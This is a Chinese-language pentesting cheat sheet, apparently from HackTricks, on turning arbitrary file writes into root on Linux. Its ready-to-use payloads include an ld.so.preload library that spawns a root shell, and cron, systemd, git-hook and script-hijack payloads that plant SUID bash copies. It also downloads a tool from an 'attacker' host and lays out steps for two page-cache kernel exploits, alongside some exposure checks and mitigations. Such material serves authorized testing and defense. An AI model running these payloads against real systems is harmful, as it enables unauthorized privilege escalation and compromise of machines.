# 向 Root 任意写入文件

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

此文件的行为类似于 **`LD_PRELOAD`** 环境变量，但它同样适用于 **SUID binaries**。\
如果你可以创建或修改它，只需添加一个**将在每个执行的 binary 中加载的 library 路径**即可。

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是在 git repository 中各种**事件**发生时运行的**脚本**，例如创建 commit、进行 merge……因此，如果某个**特权脚本或用户**经常执行这些操作，并且可以**写入 `.git` 文件夹**，就可以利用这一点进行 **privesc**。

例如，可以在 git repo 的 **`.git/hooks`** 中**生成一个脚本**，使其在创建新 commit 时始终执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron 与时间文件

如果你能**写入由 root 执行的 cron 相关文件**，通常就能在任务下次运行时获得代码执行。值得关注的目标包括：

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- Root 在 `/var/spool/cron/` 或 `/var/spool/cron/crontabs/` 中的 crontab
- `systemd` timers 以及它们触发的 services

快速检查：
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的滥用路径：

- **向 `/etc/crontab` 或 `/etc/cron.d/` 中的文件追加新的 root cron job**
- **替换已由 `run-parts` 执行的 script**
- **通过修改现有 timer target 启动的 script 或 binary，对其植入后门**

最小 cron payload 示例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
如果你只能写入一个由 `run-parts` 使用的 cron 目录，请改为在那里放置一个可执行文件：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注意：

- `run-parts` 通常会忽略包含点号的文件名，因此优先使用 `backup` 这样的名称，而不是 `backup.sh`。
- 某些发行版使用 `anacron` 或 `systemd` timers，而不是传统的 cron，但滥用思路相同：**修改 root 稍后将执行的内容**。

### Service & Socket 文件

如果你可以写入 **`systemd` unit 文件**或其中引用的文件，则可能通过重新加载并重启该 unit，或等待 service/socket activation 路径触发，以 root 身份实现 code execution。

有趣的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 Drop-in overrides
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 所引用的 Service scripts/binaries
- root service 加载的可写 `EnvironmentFile=` 路径

快速检查：
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
常见的滥用路径：

- **Overwrite `ExecStart=`** in a root-owned service unit you can modify
- **Add a drop-in override** with a malicious `ExecStart=` and clear the old one first
- **Backdoor the script/binary** already referenced by the unit
- **Hijack a socket-activated service** by modifying the corresponding `.service` file that starts when the socket receives a connection

恶意 override 示例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型激活流程：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
如果你无法自行重启服务，但可以编辑一个由 socket 激活的 unit，那么你可能只需**等待客户端连接**，即可触发被植入后门的服务以 root 身份执行。

### 覆盖特权 PHP sandbox 使用的受限 `php.ini`

一些自定义 daemon 会通过使用**受限的 `php.ini`**（例如 `disable_functions=exec,system,...`）运行 `php`，来验证用户提供的 PHP。如果 sandboxed code 仍具有**任何写入原语**（例如 `file_put_contents`），并且你能够访问 daemon 使用的**确切 `php.ini` 路径**，就可以**覆盖该配置**以解除限制，然后提交第二个 payload，以提升后的权限运行。

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 第二个 payload 在危险函数重新启用后执行代码。

最小示例（替换为 daemon 使用的路径）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
如果 daemon 以 root 身份运行（或使用 root 所有的路径进行验证），第二次执行将获得 root context。当受 sandbox 限制的 runtime 仍能写入文件时，这本质上就是通过覆盖配置实现的 **privilege escalation**。

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪些 binary 应该执行哪种类型的文件。TODO：检查滥用此机制的要求，以便在打开常见文件类型时执行 rev shell。

### 覆盖 schema handlers（如 http: 或 https:）

拥有 victim 配置目录写权限的 attacker 可以轻松替换或创建改变系统行为的文件，从而导致非预期的 code execution。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL handlers 指向恶意文件（例如设置 `x-scheme-handler/http=evil.desktop`），attacker 可以确保 **点击任何 http 或 https 链接都会触发 `evil.desktop` 文件中指定的代码**。例如，将以下恶意代码放入 `$HOME/.local/share/applications` 中的 `evil.desktop` 后，点击任何外部 URL 都会运行其中嵌入的命令：
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
如需了解更多信息，请查看[**这篇文章**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)，其中介绍了如何利用一个真实漏洞。

### Root 执行用户可写的脚本/二进制文件

如果某个特权工作流运行类似 `/bin/sh /home/username/.../script` 的命令（或运行非特权用户拥有的目录中的任何二进制文件），你就可以劫持它：

- **检测执行过程：**使用 [pspy](https://github.com/DominicBreuker/pspy) 监控进程，以捕获 root 调用用户可控路径的情况：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **确认可写性：**确保目标文件及其目录均由你的用户拥有/可写。
- **劫持目标：**备份原始 binary/script，并放置一个创建 SUID shell（或执行其他 root 操作）的 payload，然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发 privileged action**（例如按下会 spawn helper 的 UI button）。当 root 重新执行被劫持的 path 时，使用 `./rootshell -p` 获取 escalated shell。

### 仅修改 page cache 中 privileged binaries 的文件

某些 kernel bugs 不会修改**磁盘上的文件**。相反，它们只允许你修改可读文件的 **page cache 副本**。如果目标是 **setuid** 或其他由 **root 执行**的 binary，那么下一次执行可能会运行内存中由 attacker 控制的 bytes，即使磁盘上的文件 hash 保持不变，也能完成 privilege escalation。

可以将其理解为一种**仅运行时的文件写入 primitive**：

- **磁盘保持干净**：inode 和磁盘上的 bytes 不会改变
- **内存处于 dirty 状态**：读取或执行 cached page 的进程会获得 attacker 修改后的内容
- **效果是临时的**：重启或 cache eviction 后修改会消失

这种 primitive 介于传统的 **arbitrary file write** 与 Dirty COW / Dirty Pipe 等较早的 **page-cache abuse** bugs 之间：

- Dirty COW 依赖 race
- Dirty Pipe 受到 write-position 限制
- 如果 vulnerable path 能够直接写入 cached file-backed pages，page-cache-only primitive 可能更加可靠

#### Generic privesc flow

1. 获取能够写入 **file-backed page cache pages** 的 kernel primitive
2. 对 **可读的 privileged binary** 或其他由 root 执行的文件使用该 primitive
3. 在 page 被从 cache eviction 之前触发执行
4. 在磁盘文件看起来仍未被修改的情况下，以 root 身份获得 code execution

典型的高价值目标：

- **setuid-root** binaries
- 由 **root services** 启动的 helpers
- 经常从共享 host kernel/page cache 的 **containers** 中执行的 binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) 是此类问题的一个很好的例子。vulnerable path 位于 Linux crypto userspace API（`AF_ALG` / `algif_aead`）中：

- `splice()` 可以将 readable file 的 page-cache pages 引用移动到 crypto TX scatterlist
- in-place 的 `algif_aead` decrypt path 会复用 source 和 destination buffers
- `authencesn` 随后会写入 destination tag region
- 当该 region 仍然引用 spliced file-backed pages 时，写入就会落入目标文件的 **page cache**

因此，这里的有趣 technique 并不是 CVE 本身，而是以下 pattern：

- 将 file-backed cache pages **提供给 kernel subsystem**
- 让该 subsystem 将其**视为可写 output**
- 在内存中触发一次受控的小范围 overwrite

公开 PoC 使用重复的 **4-byte writes** 修改内存中的 `/usr/bin/su`，然后执行它。

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) 展示了同一种 **page-cache-only write-to-root** pattern 的另一种变体，但这次 sink 是 **IPsec ESP decrypt**，而不是 `AF_ALG`。

重要 technique 是 **metadata-laundering step**：

- `splice()` 将一个**只读的 file-backed page-cache page** 放入 ESP-in-UDP packet
- 原始 DirtyFrag mitigation 为该 skb 添加 `SKBFL_SHARED_FRAG` tag，使 `esp_input()` 在 decrypt 前执行 **copy**
- netfilter `TEE` 通过 `nf_dup_ipv4()` -> `__pskb_copy_fclone()` duplicate 该 packet
- clone 保留**同一个物理 page-cache reference**，但丢失 `SKBFL_SHARED_FRAG`
- `esp_input()` 随后将该 clone 视为安全对象，并对 file-backed page 执行 in-place `cbc(aes)` decrypt

因此，给 reviewer 的 lesson 不仅适用于该 CVE：如果某项 mitigation 依赖 **skb/page metadata** 来决定某个 operation 是否必须先 copy，那么任何**保留 backing page 但丢弃 metadata 的 clone/copy path** 都可能在不知不觉中重新开启该 write primitive。

典型 exploitation flow：

1. 使用 `unshare(CLONE_NEWUSER | CLONE_NEWNET)`，在 private network namespace 中获得 **`CAP_NET_ADMIN`**
2. 启用 loopback，并在 `mangle/OUTPUT` 中安装 netfilter `TEE` rule
3. 通过 `NETLINK_XFRM` 安装 **XFRM ESP transport SAs**
4. 将每个目标 4-byte word 编码到 SA `seq_hi` field 中（DirtyFrag 的 word-selection trick）
5. 发送 spliced ESP-in-UDP packet，使 **TEE clone** 到达 `esp_input()` 并执行 in-place decrypt
6. 重复上述过程，直到 `/usr/bin/su` 或其他 privileged executable 的 page-cache copy 中包含由 attacker 控制的 code

从实际影响来看，这与 `AF_ALG` example 相同：磁盘上的文件保持干净，但 `execve()` 会使用**已被修改的 page-cache bytes**，从而获得 root。

此变体的实用 exposure checks：
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
这里，短期攻击面缩减同样是 path-specific 的：升级到包含 `48f6a5356a33` 的内核可修复 clone path，而阻止 `xt_TEE` autoload 会移除 **flag-laundering step**，阻止 `esp4` / `esp6` 则会移除 **decrypt sink**。

#### 暴露面与 hunting

如果怀疑存在这类 bug，不要只依赖磁盘完整性检查。还应验证：
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`：`algif_aead` 可以作为模块加载或卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`：该接口已内置于 kernel
- setuid 二进制文件是很好的目标，因为仅通过 page-cache-only patch，就可能将本地 foothold 提升为 root

#### `algif_aead` 路径的 attack-surface reduction

如果存在漏洞的接口由可加载模块提供：
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
如果它被编译进内核，一些披露报告称其会阻塞 init 路径：
```bash
initcall_blacklist=algif_aead_init
```
这种缓解措施也值得在其他 kernel LPE 中牢记：如果 exploitation 依赖某个特定的可选接口，那么禁用或列入黑名单该接口，即使在还无法完成完整 kernel 升级之前，也能切断 exploit path。

## References

- [HTB Bamboo – 劫持由 root 执行的、位于用户可写 PaperCut 目录中的脚本](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall 针对 CVE-2026-31431 的 oss-security 披露](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable 修复：crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint 技术分析](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog：剖析并利用 Linux LPE 变种 DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux 修复：net: skb：在 `__pskb_copy_fclone()` 中保留 `SKBFL_SHARED_FRAG` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux 早期缓解措施：为 splice 的 UDP 数据包设置 `SKBFL_SHARED_FRAG` (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
